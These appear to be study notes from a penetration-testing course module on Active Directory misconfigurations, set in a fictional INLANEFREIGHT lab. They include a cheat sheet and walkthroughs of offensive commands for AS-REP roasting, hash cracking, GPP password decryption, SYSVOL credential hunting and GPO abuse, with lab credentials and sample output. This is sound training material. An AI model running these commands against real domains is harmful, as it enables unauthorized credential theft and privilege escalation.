# Miscellaneous Misconfigurations

---

> [!info] 🎯 Module Focus  
> Miscellaneous Active Directory misconfigurations that can provide **credential exposure, lateral movement, privilege escalation, domain compromise, or persistence**.
> 
> **Core mindset:** when enumerating AD, do not only look for obvious vulnerabilities. Look for **misconfigured permissions, exposed credentials, dangerous group memberships, weak Kerberos settings, writable GPOs, and forgotten legacy configurations**.

---

## 💻 Command Cheat Sheet

> [!card] PowerView — Active Directory Enumeration  
> PowerShell-based AD reconnaissance, user enumeration, ACL inspection, and GPO enumeration.
> 
> > [!code-card] FIND PASSWORDS IN USER DESCRIPTIONS
> > 
> > ```powershell
> > Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
> > ```
> 
> > [!code-card] FIND PASSWD_NOTREQD ACCOUNTS
> > 
> > ```powershell
> > Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
> > ```
> 
> > [!code-card] FIND USERS WITHOUT KERBEROS PRE-AUTHENTICATION
> > 
> > ```powershell
> > Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
> > ```
> 
> > [!code-card] ENUMERATE ALL GPOs
> > 
> > ```powershell
> > Get-DomainGPO |select displayname
> > ```
> 
> > [!code-card] FIND GPO ACLs FOR DOMAIN USERS
> > 
> > ```powershell
> > $sid=Convert-NameToSid "Domain Users"
> > Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
> > ```

> [!card] Group Policy — Built-in GPO Enumeration  
> Native PowerShell cmdlets for enumerating Group Policy Objects.
> 
> > [!code-card] ENUMERATE ALL GPO NAMES
> > 
> > ```powershell
> > Get-GPO -All | Select DisplayName
> > ```
> 
> > [!code-card] CONVERT GPO GUID TO NAME
> > 
> > ```powershell
> > Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
> > ```

> [!card] SecurityAssessment.ps1 — Printer Bug Enumeration  
> Checks whether Windows hosts are vulnerable to the MS-PRN Printer Bug.
> 
> > [!code-card] IMPORT SECURITY ASSESSMENT MODULE
> > 
> > ```powershell
> > Import-Module .\SecurityAssessment.ps1
> > ```
> 
> > [!code-card] CHECK HOST FOR PRINTER BUG
> > 
> > ```powershell
> > Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
> > ```

> [!card] adidnsdump — Active Directory DNS Enumeration  
> Dumps DNS records from an AD-integrated DNS zone using valid domain credentials.
> 
> > [!code-card] ENUMERATE DNS RECORDS
> > 
> > ```bash
> > adidnsdump -u inlanefreight\\forend ldap://172.16.5.5
> > ```
> 
> > [!code-card] RESOLVE UNKNOWN DNS RECORDS
> > 
> > ```bash
> > adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
> > ```
> 
> > [!code-card] REVIEW ENUMERATED DNS RECORDS
> > 
> > ```bash
> > head records.csv
> > ```

> [!card] gpp-decrypt — GPP Credential Recovery  
> Decrypts legacy Group Policy Preferences `cpassword` values.
> 
> > [!code-card] DECRYPT GPP CPASSWORD
> > 
> > ```bash
> > gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
> > ```

> [!card] CrackMapExec — GPP Credential Hunting  
> Searches SMB/SYSVOL for Group Policy Preferences credentials and autologon information.
> 
> > [!code-card] LIST GPP MODULES
> > 
> > ```bash
> > crackmapexec smb -L | grep gpp
> > ```
> 
> > [!code-card] FIND GPP AUTOLOGON CREDENTIALS
> > 
> > ```bash
> > crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
> > ```

> [!card] Rubeus — AS-REP Roasting  
> Requests AS-REP authentication material from accounts without Kerberos pre-authentication.
> 
> > [!code-card] REQUEST AS-REP IN HASHCAT FORMAT
> > 
> > ```powershell
> > .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
> > ```

> [!card] Hashcat — AS-REP Hash Cracking  
> Performs offline cracking of Kerberos AS-REP hashes.
> 
> > [!code-card] CRACK AS-REP HASH
> > 
> > ```bash
> > hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt
> > ```

> [!card] Kerbrute — User Enumeration & AS-REP Roasting  
> Enumerates valid domain usernames and automatically identifies users without Kerberos pre-authentication.
> 
> > [!code-card] ENUMERATE DOMAIN USERS
> > 
> > ```bash
> > kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
> > ```

> [!card] Impacket GetNPUsers — AS-REP Roasting  
> Hunts for accounts with `UF_DONT_REQUIRE_PREAUTH` and retrieves AS-REP hashes.
> 
> > [!code-card] HUNT USERS WITHOUT PRE-AUTH
> > 
> > ```bash
> > GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users
> > ```

> [!card] SharpGPOAbuse — GPO Abuse  
> Abuses writable Group Policy Objects to perform actions such as local-admin membership or scheduled-task execution.
> 
> > [!code-card] GPO ABUSE
> > 
> > ```text
> > SharpGPOAbuse
> > ```
> > 
> > [!important]  
> > The source introduces SharpGPOAbuse as the tool for GPO abuse but does not provide a specific invocation command. Do not invent one.

> [!card] SYSVOL — Credential Hunting  
> Searches domain-readable scripts and Group Policy files for exposed credentials.
> 
> > [!code-card] LIST SYSVOL SCRIPTS
> > 
> > ```powershell
> > ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
> > ```
> 
> > [!code-card] READ INTERESTING SCRIPT
> > 
> > ```powershell
> > cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs
> > ```

---

# 🏗️ Scenario Setup

The section uses both **Windows and Linux attack hosts**.

From the Windows attack host `MS01`, a PowerShell console can be used to SSH into:

```text
172.16.5.225
```

Credentials:

```text
htb-student:HTB_@cademy_stdnt!
```

This allows switching between Windows and Linux tooling depending on the technique being demonstrated.

---

# 1. 🔄 Exchange-Related Group Membership

> [!important] Exchange Can Become an AD Privilege Escalation Path  
> A default Microsoft Exchange deployment without a split-administration model can introduce significant privileges into Active Directory.

### Exchange Windows Permissions

The **Exchange Windows Permissions** group is particularly interesting because:

- It is **not a protected group**.
    
- Members can write a **DACL to the domain object**.
    
- Domain-object DACL control can potentially be leveraged to grant **DCSync** privileges.
    
- Accounts may be added to this group through:
    
    - DACL misconfigurations.
        
    - A compromised account belonging to **Account Operators**.
        
- User accounts and computers may both appear as members.
    
- Support staff and remote-office power users may be placed into the group because they need password-reset capabilities.
    

[Exchange-AD-Privesc GitHub repository](https://github.com/gdedrouas/Exchange-AD-Privesc?utm_source=chatgpt.com)

### Organization Management

**Organization Management** is another extremely powerful Exchange group.

Think of it as the Exchange equivalent of a highly privileged administrative group:

- Can access mailboxes belonging to domain users.
    
- Sysadmins are sometimes members.
    
- Has full control over the **Microsoft Exchange Security Groups** OU.
    
- That OU contains **Exchange Windows Permissions**.
    

> [!warning] Exchange Server Compromise  
> Compromising an Exchange server can potentially lead to **Domain Admin-level access**.
> 
> Exchange servers may also contain substantial credential material in memory because users authenticate through **Outlook Web Access (OWA)** and Exchange can cache authentication material.

---

# 2. 🔥 PrivExchange

**PrivExchange** abuses a flaw in the Exchange Server `PushSubscription` feature.

### Attack Concept

A domain user with a mailbox can force the Exchange server to authenticate to an attacker-controlled host over HTTP.

The important chain is:

```text
Authenticated Domain User
        ↓
Exchange PushSubscription
        ↓
Force Exchange → Authenticate to Attacker
        ↓
Relay Authentication
        ↓
LDAP / Other Domain Services
        ↓
Potential Domain Privilege Escalation
```

The Exchange service runs as **SYSTEM** and historically had excessive privileges, including `WriteDacl` on the domain before the relevant 2019 cumulative update.

### Potential Impact

If authentication can be relayed to LDAP, the attack can potentially be used to:

- Modify domain permissions.
    
- Obtain DCSync privileges.
    
- Retrieve the NTDS database.
    
- Reach Domain Admin-level control.
    

If LDAP relay is unavailable, the authentication may potentially be relayed against other hosts.

> [!warning] Defensive Context  
> The exact exploitability depends on the Exchange version, patch level, relay protections, LDAP configuration, and environmental conditions.

---

# 3. 🖨️ Printer Bug / MS-RPRN

The **Printer Bug** abuses functionality in the **MS-RPRN Print System Remote Protocol**.

The relevant RPC methods are:

```text
RpcOpenPrinter
        ↓
RpcRemoteFindFirstPrinterChangeNotificationEx
        ↓
Force server authentication
        ↓
Attacker-controlled host over SMB
```

The spooler service commonly runs as:

```text
SYSTEM
```

### Potential Abuse

Authentication coerced from a vulnerable host can potentially be relayed to:

- LDAP
    
- SMB
    
- Other services supporting the relevant authentication mechanism
    

A successful LDAP relay may allow an attacker to obtain **DCSync privileges**.

Another potential path is:

```text
Printer Bug
    ↓
LDAP Relay
    ↓
RBCD Configuration
    ↓
Attacker-controlled Computer Account
    ↓
Authenticate as users to victim computer
```

### Cross-Forest Relevance

The technique can also have implications across forest trusts.

A compromised Domain Controller in one forest may potentially be used to attack another forest if:

- The trust permits the required delegation behavior.
    
- The target has relevant delegation configuration.
    
- The attacker already has the necessary administrative control.
    

> [!warning] Trust Configuration Matters  
> TGT delegation across trusts is **not enabled by default in modern configurations**, so this path depends heavily on the environment.

### Enumerating for MS-PRN Printer Bug

[Security-Assessment-PS GitHub repository](https://github.com/itzvenom/Security-Assessment-PS?utm_source=chatgpt.com)

```powershell
Import-Module .\SecurityAssessment.ps1

Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

Example:

```text
ComputerName                          Status
------------                          ------
ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL   True
```

`True` indicates that the host responded as vulnerable to the check.

[MS-PRN Printer Bug research](https://blog.sygnia.co/demystifying-the-print-nightmare-vulnerability?utm_source=chatgpt.com)

---

# 4. ⚠️ MS14-068

**MS14-068** was a vulnerability in the Kerberos protocol that could allow an authenticated domain user to elevate privileges to Domain Admin.

### Kerberos PAC Mental Model

A Kerberos ticket contains information about the user, including:

- Account name
    
- User ID
    
- Group membership
    

This information is stored in the **Privilege Attribute Certificate (PAC)**.

Normally:

```text
KDC creates PAC
      ↓
KDC signs PAC
      ↓
KDC can validate integrity
```

MS14-068 allowed attackers to create a **forged PAC** that could be accepted as legitimate.

The forged PAC could represent the user as belonging to privileged groups such as:

```text
Domain Administrators
```

### Tools

Possible exploitation tooling included:

- **PyKEK**
    
- **Impacket**
    

[PyKEK GitHub repository](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek?utm_source=chatgpt.com)

> [!important] Mitigation  
> The primary defense is **patching affected systems**.

The Hack The Box machine **Mantis** demonstrates this vulnerability.

---

# 5. 🔑 Sniffing LDAP Credentials

Applications and network devices such as printers frequently store LDAP credentials in their web administration interfaces.

### Common Weaknesses

Look for:

- Weak/default web-admin passwords.
    
- LDAP credentials displayed in cleartext.
    
- `Test Connection` functionality.
    
- LDAP connection settings that can be modified.
    

### Attack Concept

If a device allows the LDAP destination to be changed:

```text
Normal configuration:

Device → LDAP Server

Modified configuration:

Device → Attacker IP : TCP/389
```

An attacker can listen on LDAP port `389` and potentially receive the credentials when the device performs its connection test.

### Why It Matters

LDAP service accounts may be:

- Privileged.
    
- Reused elsewhere.
    
- Useful for initial domain access.
    

Even a low-privileged account can potentially become an initial foothold.

> [!tip] Important Detail  
> Some devices require a **full LDAP server** rather than a simple listener for the connection test to complete successfully.

[Just a Printer — LDAP credential research](https://grimhacker.com/2018/03/09/just-a-printer/?utm_source=chatgpt.com)

---

# 6. 🌐 Enumerating Active Directory DNS Records

[adidnsdump GitHub repository](https://github.com/dirkjanm/adidnsdump?utm_source=chatgpt.com)

`adidnsdump` can enumerate DNS records from an AD-integrated DNS zone using valid domain credentials.

### Why This Is Useful

Suppose normal enumeration returns:

```text
SRV01934.INLANEFREIGHT.LOCAL
```

A non-descriptive hostname does not tell us much.

DNS may contain another record pointing to the same IP:

```text
JENKINS.INLANEFREIGHT.LOCAL → 172.16.5.240
```

That descriptive hostname immediately gives us additional information about what the server may be running.

### Why adidnsdump Works

By default:

- Authenticated domain users can list child objects of DNS zones.
    
- LDAP DNS queries do not necessarily return every DNS record.
    
- `adidnsdump` resolves and retrieves additional records from the AD-integrated DNS zone.
    

---

## 🔎 Enumerating DNS Records

```bash
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5
```

Output:

```text
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Querying zone for records
[+] Found 27 records
```

---

## 📄 Reviewing `records.csv`

```bash
head records.csv
```

Example:

```text
type,name,value
?,LOGISTICS,?
AAAA,ForestDnsZones,dead:beef::7442:c49d:e1d7:2691
AAAA,ForestDnsZones,dead:beef::231
A,ForestDnsZones,10.129.202.29
A,ForestDnsZones,172.16.5.240
A,ForestDnsZones,172.16.5.5
```

The initial output contains:

```text
?,LOGISTICS,?
```

The record is present, but its IP address is unknown.

---

## 🔎 Resolving Unknown Records

Use `-r`:

```bash
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
```

The tool performs an `A` query to resolve unknown records.

The previously hidden record can then become:

```text
A,LOGISTICS,172.16.5.240
```

> [!tip] CPTS Mindset  
> Always investigate DNS records that appear unrelated to the obvious hostnames returned during enumeration. DNS can reveal **descriptive aliases and hidden infrastructure**.

---

# 7. 📝 Passwords in User Description Fields

Sensitive information is sometimes stored directly in AD user attributes such as:

- `Description`
    
- `Notes`
    

PowerView can quickly enumerate these values.

## Finding Passwords

```powershell
Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
```

Example:

```text
samaccountname    description
--------------    -----------
administrator     Built-in account for administering the computer/domain
guest             Built-in account for guest access to the computer/domain
krbtgt            Key Distribution Center Service Account
ldap.agent        *** DO NOT CHANGE *** 3/12/2012: Sunsh1ne4All!
```

> [!warning] Credential Hunting  
> Do not assume account descriptions are harmless metadata. Legacy documentation, temporary notes, and administrator comments can contain passwords or other sensitive information.

For large domains, exporting the results to CSV can make offline review easier.

---

# 8. 🚨 `PASSWD_NOTREQD`

The `PASSWD_NOTREQD` flag appears in the `userAccountControl` attribute.

When present, the account is not subject to the current password-policy requirement for password length.

This can potentially mean:

```text
Short password
        OR
No password
```

if empty passwords are permitted.

> [!important] Do NOT Misinterpret the Flag  
> `PASSWD_NOTREQD` **does not mean the account definitely has no password**.
> 
> It only means that the normal password requirement does not apply in the usual way.

### Why It Appears

Possible reasons include:

- Intentionally configured accounts.
    
- Administrative mistakes.
    
- Vendor software.
    
- Installation processes that set the flag and never remove it.
    

### Enumerating Accounts

```powershell
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

Example:

```text
samaccountname    useraccountcontrol
--------------    ------------------
guest             ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
mlowe             PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
ehamilton         PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
nagiosagent       PASSWD_NOTREQD, NORMAL_ACCOUNT
```

> [!tip] Assessment Workflow  
> Enumerate these accounts and determine whether an empty or weak password is actually accepted. The flag alone is **not proof of an empty password**.

---

# 9. 📂 Credentials in SMB Shares & SYSVOL Scripts

The **SYSVOL** share is especially valuable for credential hunting.

Authenticated domain users can generally read domain SYSVOL content, which may contain:

- Batch scripts
    
- VBScript
    
- PowerShell scripts
    
- Legacy administrative scripts
    
- Group Policy files
    
- Old credentials
    

### Finding Interesting Scripts

```powershell
ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
```

Example:

```text
daily-runs.zip
disable-nbtns.ps1
Logon Banner.htm
reset_local_admin_pass.vbs
```

The interesting file is:

```text
reset_local_admin_pass.vbs
```

---

## 🔍 Reading the Script

```powershell
cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs
```

The script contains:

```vbscript
sUser = "Administrator"
sPwd = "!ILFREIGHT_L0cALADmin!"
```

This exposes a password for the built-in local Administrator account.

### Next Assessment Step

The password should be checked against appropriate hosts to determine whether it is:

- Still active.
    
- Reused.
    
- Associated with local Administrator accounts.
    

The source specifically references CrackMapExec's `--local-auth` functionality for testing local authentication.

> [!warning] Password Reuse  
> A password found in an old script may be obsolete, but it may also still work elsewhere. Legacy credentials are therefore worth validating during an authorized assessment.

---

# 10. 🔐 Group Policy Preferences (GPP) Passwords

Older **Group Policy Preferences** configurations could store credentials inside XML files in SYSVOL.

Examples include:

- `drives.xml` — mapped drives
    
- `printers.xml` — printer configuration
    
- `services.xml` — services
    
- `scheduledtasks.xml` — scheduled tasks
    
- Local user creation
    
- Local Administrator password changes
    

## The `cpassword` Problem

GPP stored passwords using the:

```text
cpassword
```

attribute.

Although the value was encrypted using AES-256, Microsoft published the relevant AES private key.

Therefore:

```text
SYSVOL
   ↓
Groups.xml / other GPP XML
   ↓
cpassword
   ↓
Known Microsoft AES key
   ↓
Decrypt password
```

> [!important] Historical Vulnerability  
> Microsoft patched the ability to create new GPP passwords in **2014** with MS14-025.
> 
> However, the patch did **not automatically remove existing password-containing XML files from SYSVOL**.

Deleting a GPP policy rather than unlinking it can also leave cached copies on local computers.

[Microsoft MS14-025 documentation](https://support.microsoft.com/en-us/topic/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevation-of-privilege-may-13-2014-60734e15-af79-26ca-ea53-8cd617073c30?utm_source=chatgpt.com)

---

## 🔓 Decrypting a `cpassword`

[gpp-decrypt documentation/source](https://github.com/t0thkr1s/gpp-decrypt?utm_source=chatgpt.com)

```bash
gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
```

Example result:

```text
Password1
```

---

## 🕵️ Locating GPP Passwords

Potential tools include:

- `Get-GPPPassword.ps1`
    
- Metasploit GPP post module
    
- Python/Ruby GPP tools
    
- CrackMapExec
    

[Get-GPPPassword.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1?utm_source=chatgpt.com)

### CrackMapExec GPP Modules

```bash
crackmapexec smb -L | grep gpp
```

Example:

```text
gpp_autologin
gpp_password
```

The modules provide different functionality:

|Module|Purpose|
|---|---|
|`gpp_autologin`|Searches for `Registry.xml` autologon credentials|
|`gpp_password`|Retrieves GPP passwords and related account information|

---

# 11. 🔓 GPP Autologon Credentials

`Registry.xml` can contain credentials configured for automatic logon.

Unlike the historical `cpassword` issue, these credentials may be stored in **cleartext**.

### Why This Happens

An organization may configure shared workstations to automatically log in so that different users can use the machine across shifts.

The credentials may belong to:

- Local administrators
    
- Service accounts
    
- Privileged users
    
- Legacy/expired accounts
    

### Hunting with CrackMapExec

```bash
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
```

Example:

```text
[+] Found SYSVOL share
[*] Searching for Registry.xml
[*] Found .../Machine/Preferences/Registry/Registry.xml
[+] Found credentials ...
Usernames: ['guarddesk']
Domains: ['INLANEFREIGHT.LOCAL']
Passwords: ['ILFreightguardadmin!']
```

### Assessment Workflow

When credentials are discovered:

```text
Credentials found
       ↓
Identify account type
       ↓
Test appropriate authentication
       ↓
Determine privileges
       ↓
Check access to other hosts
       ↓
Check password reuse
       ↓
Look for additional access
```

> [!tip] Password Reuse  
> A GPP credential may belong to a disabled, expired, or legacy account. Even so, the password itself may have been reused elsewhere.

---

# 12. 🔥 AS-REP Roasting

**AS-REP Roasting** targets accounts that have:

```text
Do not require Kerberos pre-authentication
```

enabled.

The corresponding setting is:

```text
DONT_REQ_PREAUTH
```

### Kerberos Mental Model

Normally:

```text
User enters password
        ↓
Password protects timestamp
        ↓
DC validates authentication
        ↓
TGT issued
```

With pre-authentication disabled:

```text
Attacker requests authentication data
        ↓
DC returns AS-REP
        ↓
Encrypted using account password-derived material
        ↓
Attacker captures AS-REP
        ↓
Offline password cracking
```

> [!important] Key Difference from Kerberoasting  
> AS-REP Roasting attacks the **AS-REP**.
> 
> Kerberoasting attacks the **TGS-REP**.
> 
> **An SPN is not required for AS-REP Roasting.**

---

## 🔎 Enumerating AS-REP Roastable Users

### PowerView

```powershell
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```

Example:

```text
samaccountname     : mmorgan
userprincipalname  : mmorgan@inlanefreight.local
useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
```

---

## 🎟️ Requesting the AS-REP with Rubeus

[Rubeus GitHub repository](https://github.com/GhostPack/Rubeus?utm_source=chatgpt.com)

```powershell
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
```

Important option:

```text
/nowrap
```

Prevents the ticket/hash from being column-wrapped, making it easier to feed directly into cracking tools.

The resulting hash begins with:

```text
$krb5asrep$23$
```

---

## 🔓 Cracking the AS-REP

Hashcat mode:

```text
18200
```

Command:

```bash
hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt
```

Example recovered password:

```text
Welcome!00
```

> [!warning] Success Depends on Password Strength  
> AS-REP Roasting exposes material for **offline cracking**. A weak password can therefore lead to account compromise, while a sufficiently strong password may resist practical cracking.

---

# 13. ⚡ AS-REP Roasting with Kerbrute

Kerbrute can perform username enumeration and automatically identify accounts without Kerberos pre-authentication.

[Kerbrute GitHub repository](https://github.com/ropnop/kerbrute?utm_source=chatgpt.com)

```bash
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```

Normal valid-user results appear as:

```text
[+] VALID USERNAME: sbrown@inlanefreight.local
```

For an AS-REP roastable account:

```text
mmorgan has no pre auth required.
Dumping hash to crack offline:
$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:...
```

### Important Advantage

This technique does **not require a domain-joined attack host**.

You can:

```text
Know / enumerate username
        ↓
Identify no-preauth account
        ↓
Request AS-REP
        ↓
Crack offline
```

---

# 14. 🐍 AS-REP Roasting with Impacket

[Impacket GitHub repository](https://github.com/fortra/impacket?utm_source=chatgpt.com)

`GetNPUsers.py` can search for accounts where:

```text
UF_DONT_REQUIRE_PREAUTH
```

is set.

```bash
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users
```

It will:

- Test usernames.
    
- Identify accounts without required pre-authentication.
    
- Return AS-REP material.
    
- Format the result for offline cracking.
    

Example:

```text
[-] User sbrown@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
...
$krb5asrep$23$mmorgan@inlanefreight.local@INLANEFREIGHT.LOCAL:...
```

> [!tip] Assessment Reporting  
> Even if the returned AS-REP cannot be cracked, the configuration should still be reported because the account does not require Kerberos pre-authentication.

---

# 15. 🧭 AS-REP Roasting Decision Flow

```text
Enumerate users
      │
      ▼
DONT_REQ_PREAUTH?
      │
   ┌──┴──┐
   │     │
  NO    YES
   │     │
   │     ▼
   │  Request AS-REP
   │     │
   │     ▼
   │  Hashcat / John
   │     │
   │     ▼
   │  Password recovered?
   │     │
   │   ┌─┴─┐
   │  NO  YES
   │   │    │
   │   │    ▼
   │   │  Validate access
   │   │    │
   │   │    ▼
   │   │  Check privileges /
   │   │  reuse / lateral access
   │   │
   ▼   ▼
Continue enumeration
```

---

# 16. 🎯 GPO Abuse

**Group Policy Objects** can control:

- User configuration.
    
- Computer configuration.
    
- Operating-system settings.
    
- Application settings.
    
- Security controls.
    

GPOs are useful for hardening AD, but **writable GPOs can become an attack path**.

### Potential Abuse

An attacker with sufficient rights over a GPO may potentially:

- Grant users additional privileges.
    
- Add users to local Administrators.
    
- Create immediate scheduled tasks.
    
- Execute commands on affected computers.
    
- Establish persistence.
    

Examples of potentially interesting privileges include:

```text
SeDebugPrivilege
SeTakeOwnershipPrivilege
SeImpersonatePrivilege
```

---

## 🔎 GPO Enumeration

Potential tools include:

- PowerView
    
- BloodHound
    
- Group3r
    
- ADRecon
    
- PingCastle
    

[Group3r GitHub repository](https://github.com/Group3r/Group3r?utm_source=chatgpt.com)

[ADRecon GitHub repository](https://github.com/sense-of-security/ADRecon?utm_source=chatgpt.com)

[PingCastle](https://www.pingcastle.com/?utm_source=chatgpt.com)

---

## 📋 Enumerating GPO Names with PowerView

```powershell
Get-DomainGPO |select displayname
```

Example:

```text
Default Domain Policy
Default Domain Controllers Policy
Deny Control Panel Access
Disallow LM Hash
Deny CMD Access
Disable Forced Restarts
Block Removable Media
Disable Guest Account
Service Accounts Password Policy
Logon Banner
Disconnect Idle RDP
Disable NetBIOS
AutoLogon
GuardAutoLogon
Certificate Services
```

### What This Reveals

GPO names themselves can provide useful reconnaissance.

For example:

```text
Deny CMD Access
        ↓
Security restriction exists

Service Accounts Password Policy
        ↓
Separate service-account policy

AutoLogon / GuardAutoLogon
        ↓
Potential credential exposure

Certificate Services
        ↓
AD CS exists in the environment
```

> [!tip] Enumeration Mindset  
> GPO names can reveal **security controls, authentication configurations, and technologies deployed in the domain** before you even inspect the actual policy settings.

---

# 17. 🪟 Built-in GPO Enumeration

If the Group Policy Management tools are installed:

```powershell
Get-GPO -All | Select DisplayName
```

This provides similar GPO enumeration without PowerView.

---

# 18. 🔐 Enumerating User Rights Over GPOs

First convert the **Domain Users** group name into its SID:

```powershell
$sid=Convert-NameToSid "Domain Users"
```

Then search GPO ACLs for that SID:

```powershell
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
```

Interesting permissions may include:

```text
WriteProperty
WriteDacl
WriteOwner
```

### Why This Matters

A writable GPO can potentially become:

```text
User-controlled account
        ↓
Writable GPO
        ↓
Modify GPO
        ↓
GPO applies to OU
        ↓
Affected computers/users
        ↓
Privilege escalation / lateral movement / persistence
```

---

# 19. 🔎 Converting GPO GUID to Name

The ACL output identifies the GPO by GUID:

```text
7CA9C789-14CE-46E3-A722-83F4097AF532
```

Use:

```powershell
Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
```

Result:

```text
DisplayName      : Disconnect Idle RDP
DomainName       : INLANEFREIGHT.LOCAL
Owner            : INLANEFREIGHT\Domain Admins
Id               : 7ca9c789-14ce-46e3-a722-83f4097af532
GpoStatus        : AllSettingsEnabled
```

This maps the GUID back to the human-readable GPO:

```text
Disconnect Idle RDP
```

---

# 20. 🩸 BloodHound GPO Analysis

BloodHound can visualize relationships between:

```text
User / Group
      ↓
GPO
      ↓
OU
      ↓
Computer Objects
```

In the example:

```text
DOMAIN USERS
     │
     ├── GenericWrite
     ├── WriteOwner
     └── WriteDacl
              │
              ▼
     DISCONNECT IDLE RDP
              │
              ▼
       APPLICATION OU
              │
       ┌──────┼──────┐
       ▼      ▼      ▼
    Computer Computer Computer ...
```

The critical question is not merely:

> "Can I modify this GPO?"

It is:

> **"Where is this GPO linked, and which computers will receive the resulting changes?"**

---

# 21. 💥 SharpGPOAbuse

[SharpGPOAbuse GitHub repository](https://github.com/FSecureLABS/SharpGPOAbuse?utm_source=chatgpt.com)

SharpGPOAbuse can be used to take advantage of writable GPOs.

Potential actions include:

- Adding a controlled user to local Administrators.
    
- Creating an immediate scheduled task.
    
- Configuring a malicious computer startup script.
    
- Executing a reverse shell or other commands.
    

> [!warning] GPO Scope Is Critical  
> GPO modifications affect **every applicable object** within the linked OU.
> 
> If an editable GPO applies to an OU containing 1,000 computers, a careless modification could affect all 1,000 machines.

Therefore, before abusing a GPO:

```text
Find writable GPO
       ↓
Identify linked OU
       ↓
Identify affected computers
       ↓
Determine intended target
       ↓
Choose the least-broad applicable action
```

The source notes that the example hosts shown are **not exploitable**, and detailed GPO attacks are covered in a later module.

---

# 🧠 Key Takeaways

> [!success] Miscellaneous Misconfiguration Checklist
> 
> - 🔄 **Exchange:** investigate `Exchange Windows Permissions` and `Organization Management`.
>     
> - 🔥 **PrivExchange:** understand Exchange authentication coercion and relay paths.
>     
> - 🖨️ **Printer Bug:** enumerate systems susceptible to MS-RPRN authentication coercion.
>     
> - ⚠️ **MS14-068:** understand historical Kerberos PAC-forging attacks and patching.
>     
> - 🔑 **LDAP:** inspect web-admin consoles and connection-test functionality for exposed credentials.
>     
> - 🌐 **DNS:** use `adidnsdump` to uncover descriptive/hidden DNS records.
>     
> - 📝 **Descriptions:** search AD user descriptions for accidentally stored credentials.
>     
> - 🚨 **PASSWD_NOTREQD:** enumerate the flag, but do not assume it means the account has no password.
>     
> - 📂 **SYSVOL:** inspect scripts and configuration files for credentials.
>     
> - 🔐 **GPP:** search for legacy `cpassword` and `Registry.xml` credentials.
>     
> - ⚡ **AS-REP Roasting:** hunt for `DONT_REQ_PREAUTH`, retrieve AS-REP material, and crack offline.
>     
> - 🎯 **GPO:** enumerate GPO ACLs and determine which OUs/computers are affected before considering abuse.
>     
> - 🩸 **BloodHound:** use relationship mapping to connect **permissions → GPO → OU → computers**.
>     

> [!important] 🧠 CPTS Mental Model
> 
> ```text
> Credentials
>      ↓
> Permissions
>      ↓
> Misconfiguration
>      ↓
> What can I control?
>      ↓
> Where does that control apply?
>      ↓
> Can it give me:
> ├── Credentials
> ├── Authentication
> ├── Local Admin
> ├── DCSync
> ├── Lateral Movement
> ├── Privilege Escalation
> └── Persistence
> ```